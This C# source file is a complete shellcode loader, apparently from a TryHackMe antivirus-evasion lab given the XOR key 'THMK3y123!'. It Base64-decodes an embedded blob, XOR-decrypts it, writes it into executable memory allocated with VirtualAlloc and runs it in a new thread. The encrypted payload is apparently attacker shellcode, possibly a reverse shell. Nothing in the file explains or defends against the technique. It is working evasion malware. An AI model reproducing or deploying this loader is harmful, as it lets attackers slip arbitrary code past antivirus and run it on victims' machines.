using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
  
  private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
  public static void Main()
  {

    string dataBS64 = "qADOr8OR8TIzIRUZDBthKGd6AvMxAMYZUzG6YCtp3xptA7gLYXo8lh4CAHr6MQDynx01NE9nEzjw+z5gVYmvpmE4YHq4c3TDD3d7eOG5s6lUSE0DtrlFVXsghBjGAys9unITaFWYrh17hvhzuBXcAEydfkj4egLh+AmMgj44MPMLwSG5AUh/XTl3CvAhkBUPuDkVezLxMgnGR3s9unIvaFWYDMA38Xkz42AMCRUVaiNwanJ4FRIFyN9ZcGDMwQwJFBF78iPbZN6rtxACjQ5CAGwSZkhNCmUwuNR7oLjoTEszMLjXep1WSEmZOXN9vnJ1HcGpB7qIcIh/VnJPsp5/8NtaMiBUSBQKiVCxWTPegRgdBgKwfAPzaauIBcLxMc7ye6iVCfehPKbRzeZp3Y8nW3IhfbvRad2xDPGq3EVTzPQcyYkLMXkxe4tCOSxNSzN5MXNjYAQAxKlkLmZ/AuE+RRQKY5vNVPRlcBxMSnv0dRYr51QgBcLVL2FzY2AECR0CzLlwYnrenAXEin/w8HOJWJh3y7TmMQDge96ew0MKiXG2L1PegfO9/pEvcIiVtOnVsp57+vUaDycoQs2w0ww0iXQyJicnS2o4uOjM9A==";
    byte[] data = Convert.FromBase64String(dataBS64);

    string key = "THMK3y123!";
    //Convert Key into bytes
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);

    byte[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
